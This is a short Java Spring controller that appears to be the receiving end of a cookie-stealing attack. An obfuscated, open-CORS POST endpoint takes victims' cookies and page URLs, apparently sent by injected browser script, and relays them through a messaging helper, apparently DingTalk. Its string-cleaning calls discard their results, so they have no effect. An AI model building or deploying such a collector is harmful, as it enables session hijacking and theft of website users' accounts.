package com.example.demo.controller;

import com.example.demo.entity.Dao;
import com.example.demo.util.Util;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

import java.net.URLDecoder;

@RestController
@CrossOrigin(origins = "*")
public class Controller {

    @PostMapping("/sa2asdjnh12387zbn")
    public void sendMessage(@RequestBody Dao dao){
        String cookie = URLDecoder.decode(dao.getCookie());
        String url = URLDecoder.decode(dao.getUrl());
        url.replace("\"", "").replace("<", "").replace(">", "").replace("?", "");
        cookie.replace("\"", "").replace("<", "").replace(">", "").replace("?", "");
        Util.sendDDMessage("url: " + url + "\r\ncookie: " + cookie);
    }
}
